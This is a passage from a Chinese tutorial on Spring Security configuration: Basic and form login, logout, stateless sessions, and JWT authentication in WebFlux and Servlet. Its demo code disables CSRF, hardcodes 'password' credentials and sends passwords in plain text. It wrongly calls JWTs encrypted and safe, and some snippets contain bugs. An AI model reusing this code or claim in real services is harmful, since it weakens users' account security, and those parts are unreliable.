\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b83\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5 UserDetails loadUserByUsername(String username) \uff0c\u7528\u4e8e\u6839\u636e\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002 UserDetails \u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u7528\u6237\u540d\u3001\u5bc6\u7801\u3001\u6743\u9650\u7b49\u4fe1\u606f\u3002 DaoAuthenticationProvider \u4f1a\u6839\u636e UserDetailsService \u67e5\u8be2\u5230\u7684 UserDetails \u5bf9\u8c61\uff0c\u548c Authentication \u5bf9\u8c61\u7684 Credentials \u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\uff1b\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u6709\u4e00\u4e2a PasswordEncoder \u5c5e\u6027\uff0c\u7528\u4e8e\u5bf9\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\u3002 \u8ba4\u8bc1\u6210\u529f\u540e\uff0c AuthenticationManager \u4f1a\u628a\u8ba4\u8bc1\u540e\u7684 Authentication \u5bf9\u8c61\u5b58\u50a8\u5230 SecurityContext \u4e2d\u3002\u8fd9\u65f6\u5bf9\u8c61\u7684 Authenticated \u5c5e\u6027\u4e3a true \u3002 \u540e\u7eed Filter \u6839\u636e Authentication \u5bf9\u8c61\u7684 Authorities \u8fdb\u884c\u9274\u6743\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u4e00\u5b9a\u8981\u7406\u89e3\u597d\uff0c\u4e0b\u9762\u6211\u4eec\u6240\u6709\u7684\u914d\u7f6e\u90fd\u662f\u57fa\u4e8e\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u3002\u6211\u4eec\u4e00\u822c\u53ea\u4f1a\u6539\u53d8 AuthenticationManager \uff0c UserDetailsService \uff0c PasswordEncoder \u8fd9\u4e09\u4e2a\u7c7b\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u6d41\u7a0b\u662f\u57fa\u4e8e Servlet \u7684\uff0c\u5bf9\u4e8e WebFlux\uff0c\u6d41\u7a0b\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f Filter \u662f WebFilter\uff0c\u800c\u4e14\u5176\u5b83\u7684\u63a5\u53e3\u540d\u79f0\u90fd\u5728\u5f00\u5934\u6dfb\u52a0\u4e86 Reactive \uff0c\u4f8b\u5982 ReactiveAuthenticationManager \uff0c\u63a5\u53e3\u4ece\u76f4\u63a5\u8fd4\u56de\u503c\u53d8\u6210\u8fd4\u56de Mono \uff0c\u4f46\u662f\u5176\u5b83\u7684\u90fd\u662f\u4e00\u6837\u7684\u3002 \u6b64\u5916\uff0c\u5982\u679c\u627e\u4e0d\u5230 UserDetailsService \uff0c\u5373\u5b8c\u5168\u6ca1\u7ecf\u8fc7 Security \u914d\u7f6e\uff0c\u9ed8\u8ba4\u7684 AuthenticationManager \u903b\u8f91\u662f\u8fd9\u6837\u7684\uff1a\u5b83\u4f1a\u5728\u914d\u7f6e\u6587\u4ef6\u91cc\u627e spring.security.user.name \u548c spring.security.user.password \uff0c\u5982\u679c\u627e\u5230\u4e86\uff0c\u5c31\u7528\u8fd9\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884c\u8ba4\u8bc1\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u5bc6\u7801\uff0c\u6253\u5370\u5728\u63a7\u5236\u53f0\u4e0a\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u5bc6\u7801\u8fdb\u884c\u8ba4\u8bc1\u3002\u8fd9\u4e2a\u5bc6\u7801\u662f\u968f\u673a\u7684\uff0c\u6bcf\u6b21\u542f\u52a8\u90fd\u4e0d\u4e00\u6837\u3002\u7528\u6237\u540d\u662f user \u3002 \u914d\u7f6e Spring Security \u8fdb\u884c Basic \u8ba4\u8bc1\u4e0e\u9274\u6743 \u9996\u5148\uff0c\u6211\u4eec\u8981\u914d\u7f6e\u597d UserDetailsService\uff0c\u5b83\u7528\u4e8e\u6839\u636e\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u8fde\u63a5\u6570\u636e\u5e93\u4e86\uff0c\u800c\u662f\u76f4\u63a5\u7528 Map \u5b58\u50a8\u7528\u6237\u4fe1\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u9ed8\u8ba4\u7c7b\u3002\u6ce8\u610f\uff0c\u975e WebFlux \u7248\u672c\u6ca1\u6709 MapUserDetailsManager \uff0c\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u3002 @Bean PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean public ReactiveUserDetailsService reactiveUserDetailsService( @Autowired PasswordEncoder passwordEncoder ) { return new MapReactiveUserDetailsService( User.withUsername(\"user\") .password(passwordEncoder.encode(\"password\")) .roles(\"USER\") .build(), User.withUsername(\"admin\") .password(passwordEncoder.encode(\"password\")) .roles(\"ADMIN\") .build() ); } \u7136\u540e\u914d\u7f6e Filter\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u91cc\u7684\u914d\u7f6e\u5f88\u7b80\u5355\uff0c .httpBasic(Customizer.withDefaults()) \u8868\u793a\u4f7f\u7528 HTTP Basic \u8ba4\u8bc1\uff1b .authorizeExchange(exchanges -> exchanges... \u8868\u793a\u914d\u7f6e\u9274\u6743\u89c4\u5219\uff1b .csrf(csrf -> csrf.disable()) \u8868\u793a\u5173\u95ed CSRF \u9632\u62a4\uff1b .cors(Customizer.withDefaults()) \u8868\u793a\u914d\u7f6e CORS \u89c4\u5219\u3002 \u5176\u4e2d\uff0c pathMatchers \u8868\u793a\u5339\u914d\u8def\u5f84\uff0c permitAll \u8868\u793a\u5141\u8bb8\u6240\u6709\u7528\u6237\u8bbf\u95ee\uff0c authenticated \u8868\u793a\u53ea\u5141\u8bb8\u8ba4\u8bc1\u7528\u6237\u8bbf\u95ee\uff0c hasRole \u8868\u793a\u53ea\u5141\u8bb8\u6709\u67d0\u4e2a\u89d2\u8272\u7684\u7528\u6237\u8bbf\u95ee\u3002 \u8fd9\u91cc\u7684 Role \u5339\u914d\u5176\u5b9e\u5c31\u662f GrantedAuthority \u5339\u914d\uff0c\u53ea\u4e0d\u8fc7 Spring Security \u4e3a\u4e86\u65b9\u4fbf\uff0c\u63d0\u4f9b\u4e86 hasRole \u65b9\u6cd5\uff0c\u5b83\u4f1a\u81ea\u52a8\u52a0\u4e0a ROLE_ \u524d\u7f00\u3002\u7b80\u5355\u6765\u8bf4\uff0c\u4e3a\u4e00\u4e2a\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u89d2\u8272\uff0c\u5c31\u662f\u4e3a\u8fd9\u4e2a\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a GrantedAuthority \uff0c\u8fd9\u4e2a GrantedAuthority \u7684 getAuthority \u65b9\u6cd5\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5c31\u662f ROLE_ \u52a0\u4e0a\u89d2\u8272\u540d\u3002\u68c0\u67e5\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u53ea\u8981\u7528\u6237\u7684 Authorities \u4e2d\u5305\u542b\u8fd9\u4e2a GrantedAuthority \uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 access \u8868\u8fbe\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a SpEL \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u3002\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\u7684\u6743\u9650\u63a7\u5236\u65b9\u6cd5\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").access(\"permitAll()\") .pathMatchers(\"/resource/private\").access(\"isAuthenticated()\") .pathMatchers(\"/resource/admin\").access(\"hasRole('ADMIN')\") ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u6216\u8005\u4f7f\u7528\u57fa\u4e8e\u6ce8\u89e3\u7684\u65b9\u5f0f\u3002 @GetMapping(\"/private\") @PreAuthorize(\"isAuthenticated()\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } \u8fd9\u91cc\u7684 @PreAuthorize \u662f\u4e00\u4e2a\u6ce8\u89e3\uff0c\u5b83\u7684\u503c\u662f\u4e00\u4e2a SpEL \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u8fd9\u4e2a\u63a5\u53e3\u3002\u91cc\u9762\u7684\u5185\u5bb9\u548c access \u65b9\u6cd5\u4e00\u81f4\u3002 \u5982\u679c\u4f7f\u7528\u4e86 Spring Doc\uff0c\u5148\u52a0\u4e0a @SecurityRequirement \u6ce8\u89e3\uff0c @GetMapping(\"/private\") @SecurityRequirement(name = \"basicAuth\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } @GetMapping(\"/admin\") @SecurityRequirement(name = \"basicAuth\", scopes = \"admin\") public Mono<String> adminResource() { return Mono.just(\"Admin resource\"); } \u7136\u540e\u52a0\u4e0a @SecurityScheme \u6ce8\u89e3\uff0c package io.github.fingerbone; import org.springframework.context.annotation.Configuration; import io.swagger.v3.oas.annotations.enums.SecuritySchemeType; import io.swagger.v3.oas.annotations.security.SecurityScheme; @Configuration @SecurityScheme( name = \"basicAuth\", type = SecuritySchemeType.HTTP, scheme = \"basic\" ) public class SpringDocConfig { } \u8fd9\u6837 Swagger \u5c31\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8ba4\u8bc1\u4fe1\u606f\u3002\u6bcf\u4e2a\u6709 Security \u6ce8\u89e3\u7684\u63a5\u53e3\u90fd\u4f1a\u6709\u4e00\u4e2a\u9501\u7684\u56fe\u6807\uff0c\u70b9\u51fb\u540e\u4f1a\u5f39\u51fa\u8ba4\u8bc1\u6846\uff0c\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u9ed8\u8ba4 HTTP Basic \u662f\u6709 Cookie \u4fdd\u6301\u7684\u3002 \u8fdb\u5165\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u5de5\u5177\uff0c\u9009\u62e9 Storage\u3002\u5728 All Storage \u91cc\u5220\u6389\u6240\u6709 Cookie \u5373\u53ef\u3002 \u5f53\u7136\uff0c\u66f4\u597d\u7684\u65b9\u6cd5\u662f\u6dfb\u52a0\u4e00\u4e2a\u767b\u51fa\u63a5\u53e3\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u767b\u51fa\u4e86\u3002 @GetMapping(\"/logout\") public Mono<Void> logout(ServerWebExchange exchange) { return exchange.getPrincipal().flatMap(principal -> { if (principal instanceof Authentication) { return exchange.getExchange().getSession().doOnNext(WebSession::invalidate); } return Mono.empty(); }); } \u6216\u8005\u76f4\u63a5\u7528 Spring Security \u63d0\u4f9b\u7684 LogoutWebFilter \u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u6837\uff0c\u8bbf\u95ee /logout \u5c31\u4f1a\u767b\u51fa\u3002 \u5982\u679c\u8981\u5173\u95ed Cookie\uff0c\u53ef\u4ee5\u4f7f\u7528 securityContextRepository \uff0c\u8fd9\u4e2a\u7c7b\u7528\u4e8e\u5b58\u50a8 SecurityContext \u3002\u9ed8\u8ba4\u7684\u5b9e\u73b0\u662f WebSessionServerSecurityContextRepository \uff0c\u5b83\u4f1a\u628a SecurityContext \u5b58\u50a8\u5230 WebSession \u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 NoOpServerSecurityContextRepository \uff0c\u5b83\u4e0d\u4f1a\u5b58\u50a8 SecurityContext \u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u5982\u679c\u4f7f\u7528 Servlet \u7248\u672c\uff0c\u4f7f\u7528\u7684\u662f sessionManagement \u3002 @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .sessionManagement(sessionManagement -> sessionManagement .sessionCreationPolicy(SessionCreationPolicy.STATELESS) ) .authorizeRequests(authorizeRequests -> authorizeRequests .antMatchers(\"/resource/public\").permitAll() .antMatchers(\"/resource/private\").authenticated() .antMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyRequest().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u6837\uff0c\u5c31\u5173\u95ed\u4e86 Cookie\u3002 \u914d\u7f6e Spring Security \u8fdb\u884c\u8868\u5355\u8ba4\u8bc1\u4e0e\u9274\u6743 \u8868\u5355\u8ba4\u8bc1\u4e0e Basic \u8ba4\u8bc1\u7c7b\u4f3c\uff0c\u53ea\u662f\u8ba4\u8bc1\u65b9\u5f0f\u4e0d\u540c\u3002\u53ea\u9700\u8981\u5c06 .httpBasic(Customizer.withDefaults()) \u66ff\u6362\u6210 .formLogin(Customizer.withDefaults()) \u5373\u53ef\u3002\u5982\u679c\u4e24\u8005\u90fd\u6709\uff0c\u90a3\u4e48\u662f\u6216\u7684\u5173\u7cfb\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .formLogin(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); } \u914d\u7f6e Spring Security \u8fdb\u884c JWT \u8ba4\u8bc1\u4e0e\u9274\u6743 JWT \u8ba4\u8bc1\u539f\u7406 JWT \u4f7f\u7528 Bearer Token \u8ba4\u8bc1\uff0c\u5b83\u7684\u683c\u5f0f\u662f Bearer token \uff0c\u5176\u4e2d token \u662f Token \u7684\u5185\u5bb9\u3002Token \u7684\u5185\u5bb9\u662f\u4e00\u4e2a JSON \u5bf9\u8c61\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5982\u7528\u6237\u540d\u3001\u6743\u9650\u7b49\u3002Token \u662f\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u662f\u5b89\u5168\u7684\u3002 \u5176\u4e2d\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u4e00\u4e2a JWT Token \u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff0c\u5206\u522b\u662f Header\u3001Payload \u548c Signature\u3002Header \u5305\u542b\u4e86 Token \u7684\u7c7b\u578b\u548c\u52a0\u5bc6\u7b97\u6cd5\uff1bPayload \u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff1bSignature \u662f Header \u548c Payload \u7684\u7b7e\u540d\uff0c\u7528\u4e8e\u9a8c\u8bc1 Token \u7684\u5b8c\u6574\u6027\u3002\u4e09\u8005\u4e4b\u95f4\u7528 . \u5206\u9694\u3002JWT Token \u7531\u670d\u52a1\u5668\u8d1f\u8d23\u751f\u6210\uff0c\u5ba2\u6237\u7aef\u8d1f\u8d23\u4fdd\u5b58\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a JWT Token \u89e3\u5bc6\u540e\u7684\u5185\u5bb9\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff0c { \"header\": { \"alg\": \"HS256\", \"typ\": \"JWT\" }, \"payload\": { \"sub\": \"user\", \"roles\": [\"USER\"] }, \"signature\": \"...\" } JWT \u4e2d\u4e00\u5b9a\u4e0d\u8981\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff0c\u56e0\u4e3a JWT \u672c\u8eab\u662f\u660e\u6587\u7684\u3002 Payload \u4e2d\uff0c\u6709\u4e00\u4e9b\u5b57\u6bb5\u662f JWT \u89c4\u5b9a\u7684\uff0c\u5982 sub \u8868\u793a\u7528\u6237\uff0c exp \u8868\u793a\u8fc7\u671f\u65f6\u95f4\uff0c iat \u8868\u793a\u7b7e\u53d1\u65f6\u95f4\u7b49\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5b57\u6bb5\uff0c\u5982 roles \u8868\u793a\u7528\u6237\u7684\u89d2\u8272\u3002\u6bcf\u4e00\u6761\u8bb0\u5f55\u79f0\u4e3a\u4e00\u4e2a Claim\uff0c\u56e0\u6b64 Payload \u6709\u65f6\u4e5f\u53eb Claims\u3002 JWT \u7684\u89e3\u6790 JWT \u4e00\u822c\u4f7f\u7528\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 JJWT \u5e93\u8fdb\u884c\u89e3\u6790\u3002\u7b7e\u53d1 Token \u65f6\uff0c\u9700\u8981\u6307\u5b9a Token \u7684\u8fc7\u671f\u65f6\u95f4\u3001\u7b7e\u53d1\u65f6\u95f4\u3001\u7528\u6237\u4fe1\u606f\u7b49\u3002\u89e3\u7801 Token \u65f6\uff0c\u9700\u8981\u6307\u5b9a Token \u7684\u7b7e\u540d\u5bc6\u94a5\u3002 \u9996\u5148\u5f15\u5165\u4f9d\u8d56\uff0c dependencies { implementation 'io.jsonwebtoken:jjwt-api:0.12.6' runtimeOnly 'io.jsonwebtoken:jjwt-jackson:0.12.6' runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.12.6' } \u7136\u540e\u5b9e\u73b0\u4e00\u4e2a Util \u7c7b\u3002 import java.util.*; import javax.crypto.SecretKey; import org.springframework.beans.factory.annotation.Value; import org.springframework.security.core.Authentication; import org.springframework.security.core.GrantedAuthority; import org.springframework.security.core.userdetails.ReactiveUserDetailsService; import org.springframework.security.core.userdetails.UserDetails; import org.springframework.security.core.userdetails.UserDetailsService; import org.springframework.stereotype.Component; import io.jsonwebtoken.Claims; import io.jsonwebtoken.Jws; import io.jsonwebtoken.Jwts; @Component public class JwtUtil { private final ReactiveUserDetailsService userDetailsService; @Value(\"#{${jwt.expiration-seconds}}\") private final Integer expirationSeconds; private final SecretKey key; public JwtUtil(ReactiveUserDetailsService userDetailsService, @Value(\"${jwt.expiration-seconds}\") Integer expirationSeconds) { this.userDetailsService = userDetailsService; this.expirationSeconds = expirationSeconds; this.key = Jwts.SIG.HS256.key().build(); } public String generateToken(String username) { UserDetails userDetails = userDetailsService.findByUsername(username).block(); Date expire = new Date(System.currentTimeMillis() + expirationSeconds * 1000); String id = UUID.randomUUID().toString(); return Jwts.builder() .header() .add(\"typ\", \"JWT\") .add(\"alg\", \"HS256\") .and() .claim(\"username\", userDetails.getUsername()) .claim(\"authorities\", userDetails.getAuthorities()) .id(id) .expiration(expire) .issuedAt(new Date()) .subject(userDetails.getUsername()) .issuer(\"issuer\") .signWith( key, Jwts.SIG.HS256 ) .compact(); } public Jws<Claims> parseToken(String token) { return Jwts.parser().verifyWith(key).build().parseSignedClaims( token ); } public Authentication parseToAuthentication(String token) { Jws<Claims> jws = parseToken(token); UserDetails userDetails = userDetailsService.findByUsername(jws.getPayload().getSubject()).block(); return new Authentication() { private static final long serialVersionUID = 1L; @Override public String getName() { return userDetails.getUsername(); } @Override public Collection<? extends GrantedAuthority> getAuthorities() { return userDetails.getAuthorities(); } @Override public Object getCredentials() { return userDetails.getPassword(); } @Override public Object getDetails() { return userDetails; } @Override public Object getPrincipal() { return userDetails; } @Override public boolean isAuthenticated() { return true; } @Override public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException { throw new UnsupportedOperationException(); } }; } } \u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u7684 Servlet \u7684 UserDetailsService\uff0c\u4f7f\u7528 loadUserDetails \u65b9\u6cd5\u3002\u8fd9\u91cc\u90fd\u662f\u4e00\u4e9b\u7b80\u5355\u7684\u6784\u9020\u5668\u65b9\u6cd5\u4f7f\u7528\uff0c\u4e0d\u518d\u8d58\u8ff0\u3002 JWT \u7684\u7b7e\u53d1 \u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684 API \u8fdb\u884c\u7b7e\u53d1\u5373\u53ef\u3002\u5982\u679c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u4f7f\u7528 HTTPS\uff0c\u8981\u4e48\u4f7f\u7528\u975e\u5bf9\u79f0\u52a0\u5bc6\u8fdb\u884c\u5bc6\u7801\u4f20\u9012\u3002\u4f46\u8fd9\u91cc\u4e3a\u4e86\u6f14\u793a\uff0c\u5c31\u76f4\u63a5\u4f20\u9012\u5bc6\u7801\u4e86\u3002 @RestController @RequestMapping(\"/resource\") @RequiredArgsConstructor public class MainController { JwtUtil jwtUtil; ReactiveUserDetailsService userDetailsService; PasswordEncoder passwordEncoder; @PostMapping(\"/login\") public Mono<String> login(@RequestParam String username, @RequestParam String password) { return userDetailsService.findByUsername(username) .filter(userDetails -> passwordEncoder.matches(password, userDetails.getPassword())) .map(userDetails -> jwtUtil.generateToken(username)) .switchIfEmpty(Mono.error(new Exception(\"Authentication failed\"))); } } JWT \u7684\u9a8c\u8bc1 \u6839\u636e\u524d\u6587\uff0c\u6211\u4eec\u77e5\u9053\uff0cWebFilter \u8d1f\u8d23\u751f\u4ea7 Authentication \u5bf9\u8c61\uff0c\u800c AuthenticationManager \u8d1f\u8d23\u9a8c\u8bc1 Authentication \u5bf9\u8c61\u3002 \u56e0\u6b64\uff0c\u9996\u5148\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a WebFilter \u7528\u6765\u89e3\u6790 Token\u3002\u8fd9\u4e2a WebFilter \u90fd\u662f\u4f7f\u7528 AuthenticationWebFilter\uff0c\u5305\u542b\u4e86\u82e5\u5e72\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u8986\u5199 Convert \u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u7c7b\u9700\u8981\u4e00\u4e2a AuthenticationManager\u3002\u4f46\u56e0\u4e3a JWT \u7684\u89e3\u6790\u8fc7\u7a0b\u5c31\u662f\u9a8c\u8bc1\u8fc7\u7a0b\uff0c\u56e0\u6b64\u8fd9\u4e2a AuthenticationManager \u4e0d\u9700\u8981\u505a\u4efb\u4f55\u64cd\u4f5c\u3002 ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() { @Override public Mono<Authentication> authenticate(Authentication authentication) { if(authentication.isAuthenticated()) { return Mono.just(authentication); } else { return Mono.empty(); } } }; AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager); filter.setServerAuthenticationConverter( exchange -> { String token = exchange.getRequest().getHeaders().getFirst(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return Mono.just(authentication); } return Mono.empty(); } ); \u7136\u540e\u6211\u4eec\u628a\u5b83\u4eec\u52a0\u5230 SecurityFilterChain \u4e2d\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http, @Autowired JwtUtil jwtUtil ) { ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() { @Override public Mono<Authentication> authenticate(Authentication authentication) { if(authentication.isAuthenticated()) { return Mono.just(authentication); } else { return Mono.empty(); } } }; AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager); filter.setServerAuthenticationConverter( exchange -> { String token = exchange.getRequest().getHeaders().getFirst(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return Mono.just(authentication); } return Mono.empty(); } ); SecurityWebFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); return chain; } \u5982\u679c\u662f\u4f7f\u7528\u7684 Servlet \u7248\u672c\uff0c\u6709\u4e00\u70b9\u70b9\u4e0d\u540c\u3002\u5177\u4f53\u800c\u8a00\uff0c\u521b\u5efa AuthenticationFilter \u65f6\u9700\u8981\u4e00\u5e76\u4f20\u5165 AuthenticationConverter\u3002\u5728\u6dfb\u52a0 Filter \u65f6\u8981\u4f7f\u7528\u7c7b\u540d\u3002 \u4ee3\u7801\u5982\u4e0b\uff0c @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http, @Autowired JwtUtil jwtUtil ) { AuthenticationManager authenticationManager = new AuthenticationManager() { @Override public Authentication authenticate(Authentication authentication) throws AuthenticationException { if(authentication.isAuthenticated()) { return authentication; } else { throw new BadCredentialsException(\"Bad credentials\"); } } }; AuthenticationConverter converter = new AuthenticationConverter() { @Override public Authentication convert(HttpServletRequest request) { String token = request.getHeader(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return authentication; } return null; } }; AuthenticationFilter filter = new AuthenticationFilter(authenticationManager, converter); SecurityFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .addFilterBefore(filter, UsernamePasswordAuthenticationFilter.class) .authorizeRequests(authorizeRequests -> authorizeRequests .antMatchers(\"/resource/public\").permitAll() .antMatchers(\"/resource/private\").authenticated() .antMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyRequest().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); return chain; } \u5982\u679c\u4f7f\u7528\u4e86 SpringDoc\uff0c\u628a\u8ba4\u8bc1\u6a21\u5f0f\u5207\u6362\u4e3a bearerAuth \u5373\u53ef\u3002 @GetMapping(\"/private\") @SecurityRequirement(name = \"bearerAuth\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } @Configuration @SecurityScheme( name = \"bearerAuth\", type = SecuritySchemeType.HTTP, scheme = \"bearer\" ) class SpringDocConfig {} \u7efc\u4e0a\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86 JWT \u8ba4\u8bc1\u4e0e\u9274\u6743\u3002\u901a\u8fc7\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4e5f\u66f4\u597d\u5730\u7406\u89e3\u4e86 Spring Security \u7684\u8ba4\u8bc1\u4e0e\u9274\u6743\u6d41\u7a0b\u3002 \u4ee5\u53ca\uff0c\u7f51\u4e0a\u5f88\u591a\u6559\u7a0b\u90fd\u662f\u81ea\u5df1\u5199\u4e00\u4e2a Filter\uff0c\u7136\u540e\u5728 Filter \u91cc\u9762\u5199\u8ba4\u8bc1\u903b\u8f91\uff0c\u8fd9\u6837\u6839\u672c\u5c31\u6ca1\u8fc7 Spring Security \u7684\u8ba4\u8bc1\u6d41\u7a0b\uff0c\u8fd9\u6837\u505a\u662f\u4e0d\u5bf9\u7684\u3002\u672c\u6587\u7684\u5199\u6cd5\u624d\u662f\u6b63\u786e\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u80fd\u56e0\u4e3a Spring Security 